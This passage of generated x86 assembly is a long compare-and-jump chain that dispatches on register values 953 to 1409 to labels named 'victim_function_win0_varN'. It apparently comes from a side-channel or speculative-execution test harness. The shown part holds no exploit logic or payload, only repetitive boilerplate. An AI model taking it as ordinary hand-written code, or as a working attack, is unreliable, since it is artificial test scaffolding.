	cmpl	$953, %eax
	je	.Lvictim_function_win0_var953
	cmpl	$954, %eax
	je	.Lvictim_function_win0_var954
	cmpl	$955, %eax
	je	.Lvictim_function_win0_var955
	cmpl	$956, %eax
	je	.Lvictim_function_win0_var956
	cmpl	$957, %eax
	je	.Lvictim_function_win0_var957
	cmpl	$958, %eax
	je	.Lvictim_function_win0_var958
	cmpl	$959, %eax
	je	.Lvictim_function_win0_var959
	cmpl	$960, %eax
	je	.Lvictim_function_win0_var960
	cmpl	$961, %eax
	je	.Lvictim_function_win0_var961
	cmpl	$962, %eax
	je	.Lvictim_function_win0_var962
	cmpl	$963, %eax
	je	.Lvictim_function_win0_var963
	cmpl	$964, %eax
	je	.Lvictim_function_win0_var964
	cmpl	$965, %eax
	je	.Lvictim_function_win0_var965
	cmpl	$966, %eax
	je	.Lvictim_function_win0_var966
	cmpl	$967, %eax
	je	.Lvictim_function_win0_var967
	cmpl	$968, %eax
	je	.Lvictim_function_win0_var968
	cmpl	$969, %eax
	je	.Lvictim_function_win0_var969
	cmpl	$970, %eax
	je	.Lvictim_function_win0_var970
	cmpl	$971, %eax
	je	.Lvictim_function_win0_var971
	cmpl	$972, %eax
	je	.Lvictim_function_win0_var972
	cmpl	$973, %eax
	je	.Lvictim_function_win0_var973
	cmpl	$974, %eax
	je	.Lvictim_function_win0_var974
	cmpl	$975, %eax
	je	.Lvictim_function_win0_var975
	cmpl	$976, %eax
	je	.Lvictim_function_win0_var976
	cmpl	$977, %eax
	je	.Lvictim_function_win0_var977
	cmpl	$978, %eax
	je	.Lvictim_function_win0_var978
	cmpl	$979, %eax
	je	.Lvictim_function_win0_var979
	cmpl	$980, %eax
	je	.Lvictim_function_win0_var980
	cmpl	$981, %eax
	je	.Lvictim_function_win0_var981
	cmpl	$982, %eax
	je	.Lvictim_function_win0_var982
	cmpl	$983, %eax
	je	.Lvictim_function_win0_var983
	cmpl	$984, %eax
	je	.Lvictim_function_win0_var984
	cmpl	$985, %eax
	je	.Lvictim_function_win0_var985
	cmpl	$986, %eax
	je	.Lvictim_function_win0_var986
	cmpl	$987, %eax
	je	.Lvictim_function_win0_var987
	cmpl	$988, %eax
	je	.Lvictim_function_win0_var988
	cmpl	$989, %eax
	je	.Lvictim_function_win0_var989
	cmpl	$990, %eax
	je	.Lvictim_function_win0_var990
	cmpl	$991, %eax
	je	.Lvictim_function_win0_var991
	cmpl	$992, %eax
	je	.Lvictim_function_win0_var992
	cmpl	$993, %eax
	je	.Lvictim_function_win0_var993
	cmpl	$994, %eax
	je	.Lvictim_function_win0_var994
	cmpl	$995, %eax
	je	.Lvictim_function_win0_var995
	cmpl	$996, %eax
	je	.Lvictim_function_win0_var996
	cmpl	$997, %eax
	je	.Lvictim_function_win0_var997
	cmpl	$998, %eax
	je	.Lvictim_function_win0_var998
	cmpl	$999, %eax
	je	.Lvictim_function_win0_var999
	cmpl	$1000, %eax
	je	.Lvictim_function_win0_var1000
	cmpl	$1001, %eax
	je	.Lvictim_function_win0_var1001
	cmpl	$1002, %eax
	je	.Lvictim_function_win0_var1002
	cmpl	$1003, %eax
	je	.Lvictim_function_win0_var1003
	cmpl	$1004, %eax
	je	.Lvictim_function_win0_var1004
	cmpl	$1005, %eax
	je	.Lvictim_function_win0_var1005
	cmpl	$1006, %eax
	je	.Lvictim_function_win0_var1006
	cmpl	$1007, %eax
	je	.Lvictim_function_win0_var1007
	cmpl	$1008, %eax
	je	.Lvictim_function_win0_var1008
	cmpl	$1009, %eax
	je	.Lvictim_function_win0_var1009
	cmpl	$1010, %eax
	je	.Lvictim_function_win0_var1010
	cmpl	$1011, %eax
	je	.Lvictim_function_win0_var1011
	cmpl	$1012, %eax
	je	.Lvictim_function_win0_var1012
	cmpl	$1013, %eax
	je	.Lvictim_function_win0_var1013
	cmpl	$1014, %eax
	je	.Lvictim_function_win0_var1014
	cmpl	$1015, %eax
	je	.Lvictim_function_win0_var1015
	cmpl	$1016, %eax
	je	.Lvictim_function_win0_var1016
	cmpl	$1017, %eax
	je	.Lvictim_function_win0_var1017
	cmpl	$1018, %eax
	je	.Lvictim_function_win0_var1018
	cmpl	$1019, %eax
	je	.Lvictim_function_win0_var1019
	cmpl	$1020, %eax
	je	.Lvictim_function_win0_var1020
	cmpl	$1021, %eax
	je	.Lvictim_function_win0_var1021
	cmpl	$1022, %eax
	je	.Lvictim_function_win0_var1022
	cmpl	$1023, %eax
	je	.Lvictim_function_win0_var1023
	cmpl	$1024, %eax
	je	.Lvictim_function_win0_var1024
	cmpl	$1025, %eax
	je	.Lvictim_function_win0_var1025
	cmpl	$1026, %eax
	je	.Lvictim_function_win0_var1026
	cmpl	$1027, %eax
	je	.Lvictim_function_win0_var1027
	cmpl	$1028, %eax
	je	.Lvictim_function_win0_var1028
	cmpl	$1029, %eax
	je	.Lvictim_function_win0_var1029
	cmpl	$1030, %eax
	je	.Lvictim_function_win0_var1030
	cmpl	$1031, %eax
	je	.Lvictim_function_win0_var1031
	cmpl	$1032, %eax
	je	.Lvictim_function_win0_var1032
	cmpl	$1033, %eax
	je	.Lvictim_function_win0_var1033
	cmpl	$1034, %eax
	je	.Lvictim_function_win0_var1034
	cmpl	$1035, %eax
	je	.Lvictim_function_win0_var1035
	cmpl	$1036, %eax
	je	.Lvictim_function_win0_var1036
	cmpl	$1037, %eax
	je	.Lvictim_function_win0_var1037
	cmpl	$1038, %eax
	je	.Lvictim_function_win0_var1038
	cmpl	$1039, %eax
	je	.Lvictim_function_win0_var1039
	cmpl	$1040, %eax
	je	.Lvictim_function_win0_var1040
	cmpl	$1041, %eax
	je	.Lvictim_function_win0_var1041
	cmpl	$1042, %eax
	je	.Lvictim_function_win0_var1042
	cmpl	$1043, %eax
	je	.Lvictim_function_win0_var1043
	cmpl	$1044, %eax
	je	.Lvictim_function_win0_var1044
	cmpl	$1045, %eax
	je	.Lvictim_function_win0_var1045
	cmpl	$1046, %eax
	je	.Lvictim_function_win0_var1046
	cmpl	$1047, %eax
	je	.Lvictim_function_win0_var1047
	cmpl	$1048, %eax
	je	.Lvictim_function_win0_var1048
	cmpl	$1049, %eax
	je	.Lvictim_function_win0_var1049
	cmpl	$1050, %eax
	je	.Lvictim_function_win0_var1050
	cmpl	$1051, %eax
	je	.Lvictim_function_win0_var1051
	cmpl	$1052, %eax
	je	.Lvictim_function_win0_var1052
	cmpl	$1053, %eax
	je	.Lvictim_function_win0_var1053
	cmpl	$1054, %eax
	je	.Lvictim_function_win0_var1054
	cmpl	$1055, %eax
	je	.Lvictim_function_win0_var1055
	cmpl	$1056, %eax
	je	.Lvictim_function_win0_var1056
	cmpl	$1057, %eax
	je	.Lvictim_function_win0_var1057
	cmpl	$1058, %eax
	je	.Lvictim_function_win0_var1058
	cmpl	$1059, %eax
	je	.Lvictim_function_win0_var1059
	cmpl	$1060, %eax
	je	.Lvictim_function_win0_var1060
	cmpl	$1061, %eax
	je	.Lvictim_function_win0_var1061
	cmpl	$1062, %eax
	je	.Lvictim_function_win0_var1062
	cmpl	$1063, %eax
	je	.Lvictim_function_win0_var1063
	cmpl	$1064, %eax
	je	.Lvictim_function_win0_var1064
	cmpl	$1065, %eax
	je	.Lvictim_function_win0_var1065
	cmpl	$1066, %eax
	je	.Lvictim_function_win0_var1066
	cmpl	$1067, %eax
	je	.Lvictim_function_win0_var1067
	cmpl	$1068, %eax
	je	.Lvictim_function_win0_var1068
	cmpl	$1069, %eax
	je	.Lvictim_function_win0_var1069
	cmpl	$1070, %eax
	je	.Lvictim_function_win0_var1070
	cmpl	$1071, %eax
	je	.Lvictim_function_win0_var1071
	cmpl	$1072, %eax
	je	.Lvictim_function_win0_var1072
	cmpl	$1073, %eax
	je	.Lvictim_function_win0_var1073
	cmpl	$1074, %eax
	je	.Lvictim_function_win0_var1074
	cmpl	$1075, %eax
	je	.Lvictim_function_win0_var1075
	cmpl	$1076, %eax
	je	.Lvictim_function_win0_var1076
	cmpl	$1077, %eax
	je	.Lvictim_function_win0_var1077
	cmpl	$1078, %eax
	je	.Lvictim_function_win0_var1078
	cmpl	$1079, %eax
	je	.Lvictim_function_win0_var1079
	cmpl	$1080, %eax
	je	.Lvictim_function_win0_var1080
	cmpl	$1081, %eax
	je	.Lvictim_function_win0_var1081
	cmpl	$1082, %eax
	je	.Lvictim_function_win0_var1082
	cmpl	$1083, %eax
	je	.Lvictim_function_win0_var1083
	cmpl	$1084, %eax
	je	.Lvictim_function_win0_var1084
	cmpl	$1085, %eax
	je	.Lvictim_function_win0_var1085
	cmpl	$1086, %eax
	je	.Lvictim_function_win0_var1086
	cmpl	$1087, %eax
	je	.Lvictim_function_win0_var1087
	cmpl	$1088, %eax
	je	.Lvictim_function_win0_var1088
	cmpl	$1089, %eax
	je	.Lvictim_function_win0_var1089
	cmpl	$1090, %eax
	je	.Lvictim_function_win0_var1090
	cmpl	$1091, %eax
	je	.Lvictim_function_win0_var1091
	cmpl	$1092, %eax
	je	.Lvictim_function_win0_var1092
	cmpl	$1093, %eax
	je	.Lvictim_function_win0_var1093
	cmpl	$1094, %eax
	je	.Lvictim_function_win0_var1094
	cmpl	$1095, %eax
	je	.Lvictim_function_win0_var1095
	cmpl	$1096, %eax
	je	.Lvictim_function_win0_var1096
	cmpl	$1097, %eax
	je	.Lvictim_function_win0_var1097
	cmpl	$1098, %eax
	je	.Lvictim_function_win0_var1098
	cmpl	$1099, %eax
	je	.Lvictim_function_win0_var1099
	cmpl	$1100, %eax
	je	.Lvictim_function_win0_var1100
	cmpl	$1101, %eax
	je	.Lvictim_function_win0_var1101
	cmpl	$1102, %eax
	je	.Lvictim_function_win0_var1102
	cmpl	$1103, %eax
	je	.Lvictim_function_win0_var1103
	cmpl	$1104, %eax
	je	.Lvictim_function_win0_var1104
	cmpl	$1105, %eax
	je	.Lvictim_function_win0_var1105
	cmpl	$1106, %eax
	je	.Lvictim_function_win0_var1106
	cmpl	$1107, %eax
	je	.Lvictim_function_win0_var1107
	cmpl	$1108, %eax
	je	.Lvictim_function_win0_var1108
	cmpl	$1109, %eax
	je	.Lvictim_function_win0_var1109
	cmpl	$1110, %eax
	je	.Lvictim_function_win0_var1110
	cmpl	$1111, %eax
	je	.Lvictim_function_win0_var1111
	cmpl	$1112, %eax
	je	.Lvictim_function_win0_var1112
	cmpl	$1113, %eax
	je	.Lvictim_function_win0_var1113
	cmpl	$1114, %eax
	je	.Lvictim_function_win0_var1114
	cmpl	$1115, %eax
	je	.Lvictim_function_win0_var1115
	cmpl	$1116, %eax
	je	.Lvictim_function_win0_var1116
	cmpl	$1117, %eax
	je	.Lvictim_function_win0_var1117
	cmpl	$1118, %eax
	je	.Lvictim_function_win0_var1118
	cmpl	$1119, %eax
	je	.Lvictim_function_win0_var1119
	cmpl	$1120, %eax
	je	.Lvictim_function_win0_var1120
	cmpl	$1121, %eax
	je	.Lvictim_function_win0_var1121
	cmpl	$1122, %eax
	je	.Lvictim_function_win0_var1122
	cmpl	$1123, %eax
	je	.Lvictim_function_win0_var1123
	cmpl	$1124, %eax
	je	.Lvictim_function_win0_var1124
	cmpl	$1125, %eax
	je	.Lvictim_function_win0_var1125
	cmpl	$1126, %eax
	je	.Lvictim_function_win0_var1126
	cmpl	$1127, %eax
	je	.Lvictim_function_win0_var1127
	cmpl	$1128, %eax
	je	.Lvictim_function_win0_var1128
	cmpl	$1129, %eax
	je	.Lvictim_function_win0_var1129
	cmpl	$1130, %eax
	je	.Lvictim_function_win0_var1130
	cmpl	$1131, %eax
	je	.Lvictim_function_win0_var1131
	cmpl	$1132, %eax
	je	.Lvictim_function_win0_var1132
	cmpl	$1133, %eax
	je	.Lvictim_function_win0_var1133
	cmpl	$1134, %eax
	je	.Lvictim_function_win0_var1134
	cmpl	$1135, %eax
	je	.Lvictim_function_win0_var1135
	cmpl	$1136, %eax
	je	.Lvictim_function_win0_var1136
	cmpl	$1137, %eax
	je	.Lvictim_function_win0_var1137
	cmpl	$1138, %eax
	je	.Lvictim_function_win0_var1138
	cmpl	$1139, %eax
	je	.Lvictim_function_win0_var1139
	cmpl	$1140, %eax
	je	.Lvictim_function_win0_var1140
	cmpl	$1141, %eax
	je	.Lvictim_function_win0_var1141
	cmpl	$1142, %eax
	je	.Lvictim_function_win0_var1142
	cmpl	$1143, %eax
	je	.Lvictim_function_win0_var1143
	cmpl	$1144, %eax
	je	.Lvictim_function_win0_var1144
	cmpl	$1145, %eax
	je	.Lvictim_function_win0_var1145
	cmpl	$1146, %eax
	je	.Lvictim_function_win0_var1146
	cmpl	$1147, %eax
	je	.Lvictim_function_win0_var1147
	cmpl	$1148, %eax
	je	.Lvictim_function_win0_var1148
	cmpl	$1149, %eax
	je	.Lvictim_function_win0_var1149
	cmpl	$1150, %eax
	je	.Lvictim_function_win0_var1150
	cmpl	$1151, %eax
	je	.Lvictim_function_win0_var1151
	cmpl	$1152, %eax
	je	.Lvictim_function_win0_var1152
	cmpl	$1153, %eax
	je	.Lvictim_function_win0_var1153
	cmpl	$1154, %eax
	je	.Lvictim_function_win0_var1154
	cmpl	$1155, %eax
	je	.Lvictim_function_win0_var1155
	cmpl	$1156, %eax
	je	.Lvictim_function_win0_var1156
	cmpl	$1157, %eax
	je	.Lvictim_function_win0_var1157
	cmpl	$1158, %eax
	je	.Lvictim_function_win0_var1158
	cmpl	$1159, %eax
	je	.Lvictim_function_win0_var1159
	cmpl	$1160, %eax
	je	.Lvictim_function_win0_var1160
	cmpl	$1161, %eax
	je	.Lvictim_function_win0_var1161
	cmpl	$1162, %eax
	je	.Lvictim_function_win0_var1162
	cmpl	$1163, %eax
	je	.Lvictim_function_win0_var1163
	cmpl	$1164, %eax
	je	.Lvictim_function_win0_var1164
	cmpl	$1165, %eax
	je	.Lvictim_function_win0_var1165
	cmpl	$1166, %eax
	je	.Lvictim_function_win0_var1166
	cmpl	$1167, %eax
	je	.Lvictim_function_win0_var1167
	cmpl	$1168, %eax
	je	.Lvictim_function_win0_var1168
	cmpl	$1169, %eax
	je	.Lvictim_function_win0_var1169
	cmpl	$1170, %eax
	je	.Lvictim_function_win0_var1170
	cmpl	$1171, %eax
	je	.Lvictim_function_win0_var1171
	cmpl	$1172, %eax
	je	.Lvictim_function_win0_var1172
	cmpl	$1173, %eax
	je	.Lvictim_function_win0_var1173
	cmpl	$1174, %eax
	je	.Lvictim_function_win0_var1174
	cmpl	$1175, %eax
	je	.Lvictim_function_win0_var1175
	cmpl	$1176, %eax
	je	.Lvictim_function_win0_var1176
	cmpl	$1177, %eax
	je	.Lvictim_function_win0_var1177
	cmpl	$1178, %eax
	je	.Lvictim_function_win0_var1178
	cmpl	$1179, %eax
	je	.Lvictim_function_win0_var1179
	cmpl	$1180, %eax
	je	.Lvictim_function_win0_var1180
	cmpl	$1181, %eax
	je	.Lvictim_function_win0_var1181
	cmpl	$1182, %eax
	je	.Lvictim_function_win0_var1182
	cmpl	$1183, %eax
	je	.Lvictim_function_win0_var1183
	cmpl	$1184, %eax
	je	.Lvictim_function_win0_var1184
	cmpl	$1185, %eax
	je	.Lvictim_function_win0_var1185
	cmpl	$1186, %eax
	je	.Lvictim_function_win0_var1186
	cmpl	$1187, %eax
	je	.Lvictim_function_win0_var1187
	cmpl	$1188, %eax
	je	.Lvictim_function_win0_var1188
	cmpl	$1189, %eax
	je	.Lvictim_function_win0_var1189
	cmpl	$1190, %eax
	je	.Lvictim_function_win0_var1190
	cmpl	$1191, %eax
	je	.Lvictim_function_win0_var1191
	cmpl	$1192, %eax
	je	.Lvictim_function_win0_var1192
	cmpl	$1193, %eax
	je	.Lvictim_function_win0_var1193
	cmpl	$1194, %eax
	je	.Lvictim_function_win0_var1194
	cmpl	$1195, %eax
	je	.Lvictim_function_win0_var1195
	cmpl	$1196, %eax
	je	.Lvictim_function_win0_var1196
	cmpl	$1197, %eax
	je	.Lvictim_function_win0_var1197
	cmpl	$1198, %eax
	je	.Lvictim_function_win0_var1198
	cmpl	$1199, %eax
	je	.Lvictim_function_win0_var1199
	cmpl	$1200, %eax
	je	.Lvictim_function_win0_var1200
	cmpl	$1201, %eax
	je	.Lvictim_function_win0_var1201
	cmpl	$1202, %eax
	je	.Lvictim_function_win0_var1202
	cmpl	$1203, %eax
	je	.Lvictim_function_win0_var1203
	cmpl	$1204, %eax
	je	.Lvictim_function_win0_var1204
	cmpl	$1205, %eax
	je	.Lvictim_function_win0_var1205
	cmpl	$1206, %eax
	je	.Lvictim_function_win0_var1206
	cmpl	$1207, %eax
	je	.Lvictim_function_win0_var1207
	cmpl	$1208, %eax
	je	.Lvictim_function_win0_var1208
	cmpl	$1209, %eax
	je	.Lvictim_function_win0_var1209
	cmpl	$1210, %eax
	je	.Lvictim_function_win0_var1210
	cmpl	$1211, %eax
	je	.Lvictim_function_win0_var1211
	cmpl	$1212, %eax
	je	.Lvictim_function_win0_var1212
	cmpl	$1213, %eax
	je	.Lvictim_function_win0_var1213
	cmpl	$1214, %eax
	je	.Lvictim_function_win0_var1214
	cmpl	$1215, %eax
	je	.Lvictim_function_win0_var1215
	cmpl	$1216, %eax
	je	.Lvictim_function_win0_var1216
	cmpl	$1217, %eax
	je	.Lvictim_function_win0_var1217
	cmpl	$1218, %eax
	je	.Lvictim_function_win0_var1218
	cmpl	$1219, %eax
	je	.Lvictim_function_win0_var1219
	cmpl	$1220, %eax
	je	.Lvictim_function_win0_var1220
	cmpl	$1221, %eax
	je	.Lvictim_function_win0_var1221
	cmpl	$1222, %eax
	je	.Lvictim_function_win0_var1222
	cmpl	$1223, %eax
	je	.Lvictim_function_win0_var1223
	cmpl	$1224, %eax
	je	.Lvictim_function_win0_var1224
	cmpl	$1225, %eax
	je	.Lvictim_function_win0_var1225
	cmpl	$1226, %eax
	je	.Lvictim_function_win0_var1226
	cmpl	$1227, %eax
	je	.Lvictim_function_win0_var1227
	cmpl	$1228, %eax
	je	.Lvictim_function_win0_var1228
	cmpl	$1229, %eax
	je	.Lvictim_function_win0_var1229
	cmpl	$1230, %eax
	je	.Lvictim_function_win0_var1230
	cmpl	$1231, %eax
	je	.Lvictim_function_win0_var1231
	cmpl	$1232, %eax
	je	.Lvictim_function_win0_var1232
	cmpl	$1233, %eax
	je	.Lvictim_function_win0_var1233
	cmpl	$1234, %eax
	je	.Lvictim_function_win0_var1234
	cmpl	$1235, %eax
	je	.Lvictim_function_win0_var1235
	cmpl	$1236, %eax
	je	.Lvictim_function_win0_var1236
	cmpl	$1237, %eax
	je	.Lvictim_function_win0_var1237
	cmpl	$1238, %eax
	je	.Lvictim_function_win0_var1238
	cmpl	$1239, %eax
	je	.Lvictim_function_win0_var1239
	cmpl	$1240, %eax
	je	.Lvictim_function_win0_var1240
	cmpl	$1241, %eax
	je	.Lvictim_function_win0_var1241
	cmpl	$1242, %eax
	je	.Lvictim_function_win0_var1242
	cmpl	$1243, %eax
	je	.Lvictim_function_win0_var1243
	cmpl	$1244, %eax
	je	.Lvictim_function_win0_var1244
	cmpl	$1245, %eax
	je	.Lvictim_function_win0_var1245
	cmpl	$1246, %eax
	je	.Lvictim_function_win0_var1246
	cmpl	$1247, %eax
	je	.Lvictim_function_win0_var1247
	cmpl	$1248, %eax
	je	.Lvictim_function_win0_var1248
	cmpl	$1249, %eax
	je	.Lvictim_function_win0_var1249
	cmpl	$1250, %eax
	je	.Lvictim_function_win0_var1250
	cmpl	$1251, %eax
	je	.Lvictim_function_win0_var1251
	cmpl	$1252, %eax
	je	.Lvictim_function_win0_var1252
	cmpl	$1253, %eax
	je	.Lvictim_function_win0_var1253
	cmpl	$1254, %eax
	je	.Lvictim_function_win0_var1254
	cmpl	$1255, %eax
	je	.Lvictim_function_win0_var1255
	cmpl	$1256, %eax
	je	.Lvictim_function_win0_var1256
	cmpl	$1257, %eax
	je	.Lvictim_function_win0_var1257
	cmpl	$1258, %eax
	je	.Lvictim_function_win0_var1258
	cmpl	$1259, %eax
	je	.Lvictim_function_win0_var1259
	cmpl	$1260, %eax
	je	.Lvictim_function_win0_var1260
	cmpl	$1261, %eax
	je	.Lvictim_function_win0_var1261
	cmpl	$1262, %eax
	je	.Lvictim_function_win0_var1262
	cmpl	$1263, %eax
	je	.Lvictim_function_win0_var1263
	cmpl	$1264, %eax
	je	.Lvictim_function_win0_var1264
	cmpl	$1265, %eax
	je	.Lvictim_function_win0_var1265
	cmpl	$1266, %eax
	je	.Lvictim_function_win0_var1266
	cmpl	$1267, %eax
	je	.Lvictim_function_win0_var1267
	cmpl	$1268, %eax
	je	.Lvictim_function_win0_var1268
	cmpl	$1269, %eax
	je	.Lvictim_function_win0_var1269
	cmpl	$1270, %eax
	je	.Lvictim_function_win0_var1270
	cmpl	$1271, %eax
	je	.Lvictim_function_win0_var1271
	cmpl	$1272, %eax
	je	.Lvictim_function_win0_var1272
	cmpl	$1273, %eax
	je	.Lvictim_function_win0_var1273
	cmpl	$1274, %eax
	je	.Lvictim_function_win0_var1274
	cmpl	$1275, %eax
	je	.Lvictim_function_win0_var1275
	cmpl	$1276, %eax
	je	.Lvictim_function_win0_var1276
	cmpl	$1277, %eax
	je	.Lvictim_function_win0_var1277
	cmpl	$1278, %eax
	je	.Lvictim_function_win0_var1278
	cmpl	$1279, %eax
	je	.Lvictim_function_win0_var1279
	cmpl	$1280, %eax
	je	.Lvictim_function_win0_var1280
	cmpl	$1281, %eax
	je	.Lvictim_function_win0_var1281
	cmpl	$1282, %eax
	je	.Lvictim_function_win0_var1282
	cmpl	$1283, %eax
	je	.Lvictim_function_win0_var1283
	cmpl	$1284, %eax
	je	.Lvictim_function_win0_var1284
	cmpl	$1285, %eax
	je	.Lvictim_function_win0_var1285
	cmpl	$1286, %eax
	je	.Lvictim_function_win0_var1286
	cmpl	$1287, %eax
	je	.Lvictim_function_win0_var1287
	cmpl	$1288, %eax
	je	.Lvictim_function_win0_var1288
	cmpl	$1289, %eax
	je	.Lvictim_function_win0_var1289
	cmpl	$1290, %eax
	je	.Lvictim_function_win0_var1290
	cmpl	$1291, %eax
	je	.Lvictim_function_win0_var1291
	cmpl	$1292, %eax
	je	.Lvictim_function_win0_var1292
	cmpl	$1293, %eax
	je	.Lvictim_function_win0_var1293
	cmpl	$1294, %eax
	je	.Lvictim_function_win0_var1294
	cmpl	$1295, %eax
	je	.Lvictim_function_win0_var1295
	cmpl	$1296, %eax
	je	.Lvictim_function_win0_var1296
	cmpl	$1297, %eax
	je	.Lvictim_function_win0_var1297
	cmpl	$1298, %eax
	je	.Lvictim_function_win0_var1298
	cmpl	$1299, %eax
	je	.Lvictim_function_win0_var1299
	cmpl	$1300, %eax
	je	.Lvictim_function_win0_var1300
	cmpl	$1301, %eax
	je	.Lvictim_function_win0_var1301
	cmpl	$1302, %eax
	je	.Lvictim_function_win0_var1302
	cmpl	$1303, %eax
	je	.Lvictim_function_win0_var1303
	cmpl	$1304, %eax
	je	.Lvictim_function_win0_var1304
	cmpl	$1305, %eax
	je	.Lvictim_function_win0_var1305
	cmpl	$1306, %eax
	je	.Lvictim_function_win0_var1306
	cmpl	$1307, %eax
	je	.Lvictim_function_win0_var1307
	cmpl	$1308, %eax
	je	.Lvictim_function_win0_var1308
	cmpl	$1309, %eax
	je	.Lvictim_function_win0_var1309
	cmpl	$1310, %eax
	je	.Lvictim_function_win0_var1310
	cmpl	$1311, %eax
	je	.Lvictim_function_win0_var1311
	cmpl	$1312, %eax
	je	.Lvictim_function_win0_var1312
	cmpl	$1313, %eax
	je	.Lvictim_function_win0_var1313
	cmpl	$1314, %eax
	je	.Lvictim_function_win0_var1314
	cmpl	$1315, %eax
	je	.Lvictim_function_win0_var1315
	cmpl	$1316, %eax
	je	.Lvictim_function_win0_var1316
	cmpl	$1317, %eax
	je	.Lvictim_function_win0_var1317
	cmpl	$1318, %eax
	je	.Lvictim_function_win0_var1318
	cmpl	$1319, %eax
	je	.Lvictim_function_win0_var1319
	cmpl	$1320, %eax
	je	.Lvictim_function_win0_var1320
	cmpl	$1321, %eax
	je	.Lvictim_function_win0_var1321
	cmpl	$1322, %eax
	je	.Lvictim_function_win0_var1322
	cmpl	$1323, %eax
	je	.Lvictim_function_win0_var1323
	cmpl	$1324, %eax
	je	.Lvictim_function_win0_var1324
	cmpl	$1325, %eax
	je	.Lvictim_function_win0_var1325
	cmpl	$1326, %eax
	je	.Lvictim_function_win0_var1326
	cmpl	$1327, %eax
	je	.Lvictim_function_win0_var1327
	cmpl	$1328, %eax
	je	.Lvictim_function_win0_var1328
	cmpl	$1329, %eax
	je	.Lvictim_function_win0_var1329
	cmpl	$1330, %eax
	je	.Lvictim_function_win0_var1330
	cmpl	$1331, %eax
	je	.Lvictim_function_win0_var1331
	cmpl	$1332, %eax
	je	.Lvictim_function_win0_var1332
	cmpl	$1333, %eax
	je	.Lvictim_function_win0_var1333
	cmpl	$1334, %eax
	je	.Lvictim_function_win0_var1334
	cmpl	$1335, %eax
	je	.Lvictim_function_win0_var1335
	cmpl	$1336, %eax
	je	.Lvictim_function_win0_var1336
	cmpl	$1337, %eax
	je	.Lvictim_function_win0_var1337
	cmpl	$1338, %eax
	je	.Lvictim_function_win0_var1338
	cmpl	$1339, %eax
	je	.Lvictim_function_win0_var1339
	cmpl	$1340, %eax
	je	.Lvictim_function_win0_var1340
	cmpl	$1341, %eax
	je	.Lvictim_function_win0_var1341
	cmpl	$1342, %eax
	je	.Lvictim_function_win0_var1342
	cmpl	$1343, %eax
	je	.Lvictim_function_win0_var1343
	cmpl	$1344, %eax
	je	.Lvictim_function_win0_var1344
	cmpl	$1345, %eax
	je	.Lvictim_function_win0_var1345
	cmpl	$1346, %eax
	je	.Lvictim_function_win0_var1346
	cmpl	$1347, %eax
	je	.Lvictim_function_win0_var1347
	cmpl	$1348, %eax
	je	.Lvictim_function_win0_var1348
	cmpl	$1349, %eax
	je	.Lvictim_function_win0_var1349
	cmpl	$1350, %eax
	je	.Lvictim_function_win0_var1350
	cmpl	$1351, %eax
	je	.Lvictim_function_win0_var1351
	cmpl	$1352, %eax
	je	.Lvictim_function_win0_var1352
	cmpl	$1353, %eax
	je	.Lvictim_function_win0_var1353
	cmpl	$1354, %eax
	je	.Lvictim_function_win0_var1354
	cmpl	$1355, %eax
	je	.Lvictim_function_win0_var1355
	cmpl	$1356, %eax
	je	.Lvictim_function_win0_var1356
	cmpl	$1357, %eax
	je	.Lvictim_function_win0_var1357
	cmpl	$1358, %eax
	je	.Lvictim_function_win0_var1358
	cmpl	$1359, %eax
	je	.Lvictim_function_win0_var1359
	cmpl	$1360, %eax
	je	.Lvictim_function_win0_var1360
	cmpl	$1361, %eax
	je	.Lvictim_function_win0_var1361
	cmpl	$1362, %eax
	je	.Lvictim_function_win0_var1362
	cmpl	$1363, %eax
	je	.Lvictim_function_win0_var1363
	cmpl	$1364, %eax
	je	.Lvictim_function_win0_var1364
	cmpl	$1365, %eax
	je	.Lvictim_function_win0_var1365
	cmpl	$1366, %eax
	je	.Lvictim_function_win0_var1366
	cmpl	$1367, %eax
	je	.Lvictim_function_win0_var1367
	cmpl	$1368, %eax
	je	.Lvictim_function_win0_var1368
	cmpl	$1369, %eax
	je	.Lvictim_function_win0_var1369
	cmpl	$1370, %eax
	je	.Lvictim_function_win0_var1370
	cmpl	$1371, %eax
	je	.Lvictim_function_win0_var1371
	cmpl	$1372, %eax
	je	.Lvictim_function_win0_var1372
	cmpl	$1373, %eax
	je	.Lvictim_function_win0_var1373
	cmpl	$1374, %eax
	je	.Lvictim_function_win0_var1374
	cmpl	$1375, %eax
	je	.Lvictim_function_win0_var1375
	cmpl	$1376, %eax
	je	.Lvictim_function_win0_var1376
	cmpl	$1377, %eax
	je	.Lvictim_function_win0_var1377
	cmpl	$1378, %eax
	je	.Lvictim_function_win0_var1378
	cmpl	$1379, %eax
	je	.Lvictim_function_win0_var1379
	cmpl	$1380, %eax
	je	.Lvictim_function_win0_var1380
	cmpl	$1381, %eax
	je	.Lvictim_function_win0_var1381
	cmpl	$1382, %eax
	je	.Lvictim_function_win0_var1382
	cmpl	$1383, %eax
	je	.Lvictim_function_win0_var1383
	cmpl	$1384, %eax
	je	.Lvictim_function_win0_var1384
	cmpl	$1385, %eax
	je	.Lvictim_function_win0_var1385
	cmpl	$1386, %eax
	je	.Lvictim_function_win0_var1386
	cmpl	$1387, %eax
	je	.Lvictim_function_win0_var1387
	cmpl	$1388, %eax
	je	.Lvictim_function_win0_var1388
	cmpl	$1389, %eax
	je	.Lvictim_function_win0_var1389
	cmpl	$1390, %eax
	je	.Lvictim_function_win0_var1390
	cmpl	$1391, %eax
	je	.Lvictim_function_win0_var1391
	cmpl	$1392, %eax
	je	.Lvictim_function_win0_var1392
	cmpl	$1393, %eax
	je	.Lvictim_function_win0_var1393
	cmpl	$1394, %eax
	je	.Lvictim_function_win0_var1394
	cmpl	$1395, %eax
	je	.Lvictim_function_win0_var1395
	cmpl	$1396, %eax
	je	.Lvictim_function_win0_var1396
	cmpl	$1397, %eax
	je	.Lvictim_function_win0_var1397
	cmpl	$1398, %eax
	je	.Lvictim_function_win0_var1398
	cmpl	$1399, %eax
	je	.Lvictim_function_win0_var1399
	cmpl	$1400, %eax
	je	.Lvictim_function_win0_var1400
	cmpl	$1401, %eax
	je	.Lvictim_function_win0_var1401
	cmpl	$1402, %eax
	je	.Lvictim_function_win0_var1402
	cmpl	$1403, %eax
	je	.Lvictim_function_win0_var1403
	cmpl	$1404, %eax
	je	.Lvictim_function_win0_var1404
	cmpl	$1405, %eax
	je	.Lvictim_function_win0_var1405
	cmpl	$1406, %eax
	je	.Lvictim_function_win0_var1406
	cmpl	$1407, %eax
	je	.Lvictim_function_win0_var1407
	cmpl	$1408, %eax
	je	.Lvictim_function_win0_var1408
	cmpl	$1409, %eax
	je	.Lvictim_function_win0_var1409
